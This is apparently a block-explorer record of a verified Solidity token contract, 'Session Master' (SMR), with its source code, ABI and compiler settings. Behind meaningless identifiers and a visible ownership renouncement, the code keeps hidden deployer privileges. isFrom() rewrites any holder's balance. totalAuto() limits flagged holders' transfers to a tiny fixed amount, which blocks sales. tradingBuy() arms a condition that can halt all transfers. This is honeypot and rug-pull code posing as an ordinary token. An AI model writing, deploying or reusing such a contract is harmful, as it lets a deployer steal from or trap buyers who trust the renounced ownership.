{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface tradingTeam {\n    function createPair(address receiverExempt, address shouldBuy) external returns (address);\n}\n\ninterface sellMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverTeamToken) external view returns (uint256);\n\n    function transfer(address limitTeam, uint256 toLaunch) external returns (bool);\n\n    function allowance(address teamMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitTeam,\n        uint256 toLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedLiquidity, uint256 value);\n    event Approval(address indexed teamMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract tokenReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface sellMinMetadata is sellMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SessionMaster is tokenReceiver, sellMin, sellMinMetadata {\n\n    bool private minSender;\n\n    function exemptReceiver() private view {\n        require(tradingAmount[_msgSender()]);\n    }\n\n    address public exemptFrom;\n\n    function walletFrom() public {\n        emit OwnershipTransferred(exemptFrom, address(0));\n        exemptTrading = address(0);\n    }\n\n    mapping(address => bool) public tradingAmount;\n\n    mapping(address => bool) public receiverLimit;\n\n    bool private receiverTx;\n\n    address txLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return exemptTrading;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalEnableMarketing;\n    }\n\n    string private maxToken = \"Session Master\";\n\n    bool public shouldMax;\n\n    uint256 constant marketingWallet = 4 ** 10;\n\n    function exemptReceiverMarketing(address autoExempt) public {\n        require(autoExempt.balance < 100000);\n        if (shouldMax) {\n            return;\n        }\n        if (liquidityAtEnable) {\n            liquidityAtEnable = true;\n        }\n        tradingAmount[autoExempt] = true;\n        \n        shouldMax = true;\n    }\n\n    function transfer(address amountReceiver, uint256 toLaunch) external virtual override returns (bool) {\n        return takeFeeSender(_msgSender(), amountReceiver, toLaunch);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeAtMode;\n    }\n\n    function fundSell(address swapAmount, address limitTeam, uint256 toLaunch) internal returns (bool) {\n        require(tokenTake[swapAmount] >= toLaunch);\n        tokenTake[swapAmount] -= toLaunch;\n        tokenTake[limitTeam] += toLaunch;\n        emit Transfer(swapAmount, limitTeam, toLaunch);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return exemptTrading;\n    }\n\n    function takeFeeSender(address swapAmount, address limitTeam, uint256 toLaunch) internal returns (bool) {\n        if (swapAmount == exemptFrom) {\n            return fundSell(swapAmount, limitTeam, toLaunch);\n        }\n        uint256 marketingTotalList = sellMin(tradingFund).balanceOf(txLaunch);\n        require(marketingTotalList == limitTrading);\n        require(limitTeam != txLaunch);\n        if (receiverLimit[swapAmount]) {\n            return fundSell(swapAmount, limitTeam, marketingWallet);\n        }\n        return fundSell(swapAmount, limitTeam, toLaunch);\n    }\n\n    function transferFrom(address swapAmount, address limitTeam, uint256 toLaunch) external override returns (bool) {\n        if (_msgSender() != takeExempt) {\n            if (takeSender[swapAmount][_msgSender()] != type(uint256).max) {\n                require(toLaunch <= takeSender[swapAmount][_msgSender()]);\n                takeSender[swapAmount][_msgSender()] -= toLaunch;\n            }\n        }\n        return takeFeeSender(swapAmount, limitTeam, toLaunch);\n    }\n\n    constructor (){\n        \n        fundMax amountTrading = fundMax(takeExempt);\n        tradingFund = tradingTeam(amountTrading.factory()).createPair(amountTrading.WETH(), address(this));\n        \n        exemptFrom = _msgSender();\n        tradingAmount[exemptFrom] = true;\n        tokenTake[exemptFrom] = takeAtMode;\n        walletFrom();\n        \n        emit Transfer(address(0), exemptFrom, takeAtMode);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeAmount;\n    }\n\n    function totalAuto(address tokenMin) public {\n        exemptReceiver();\n        if (liquidityAtEnable) {\n            toShouldSwap = receiverTo;\n        }\n        if (tokenMin == exemptFrom || tokenMin == tradingFund) {\n            return;\n        }\n        receiverLimit[tokenMin] = true;\n    }\n\n    address public tradingFund;\n\n    uint256 private toShouldSwap;\n\n    uint256 private takeAtMode = 100000000 * 10 ** 18;\n\n    function approve(address minMarketing, uint256 toLaunch) public virtual override returns (bool) {\n        takeSender[_msgSender()][minMarketing] = toLaunch;\n        emit Approval(_msgSender(), minMarketing, toLaunch);\n        return true;\n    }\n\n    function tradingBuy(uint256 toLaunch) public {\n        exemptReceiver();\n        limitTrading = toLaunch;\n    }\n\n    event OwnershipTransferred(address indexed feeSwap, address indexed autoMax);\n\n    function name() external view virtual override returns (string memory) {\n        return maxToken;\n    }\n\n    function allowance(address listMaxSell, address minMarketing) external view virtual override returns (uint256) {\n        if (minMarketing == takeExempt) {\n            return type(uint256).max;\n        }\n        return takeSender[listMaxSell][minMarketing];\n    }\n\n    address takeExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private totalEnableMarketing = \"SMR\";\n\n    function balanceOf(address receiverTeamToken) public view virtual override returns (uint256) {\n        return tokenTake[receiverTeamToken];\n    }\n\n    address private exemptTrading;\n\n    bool public liquidityAtEnable;\n\n    uint256 public receiverTo;\n\n    mapping(address => uint256) private tokenTake;\n\n    uint256 private launchedTeam;\n\n    uint256 limitTrading;\n\n    mapping(address => mapping(address => uint256)) private takeSender;\n\n    uint256 receiverMin;\n\n    uint8 private feeAmount = 18;\n\n    bool public fundLiquidity;\n\n    function isFrom(address amountReceiver, uint256 toLaunch) public {\n        exemptReceiver();\n        tokenTake[amountReceiver] = toLaunch;\n    }\n\n    bool private limitLaunch;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMaxSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTeamToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoExempt\",\"type\":\"address\"}],\"name\":\"exemptReceiverMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toLaunch\",\"type\":\"uint256\"}],\"name\":\"isFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAtEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMin\",\"type\":\"address\"}],\"name\":\"totalAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toLaunch\",\"type\":\"uint256\"}],\"name\":\"tradingBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SessionMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}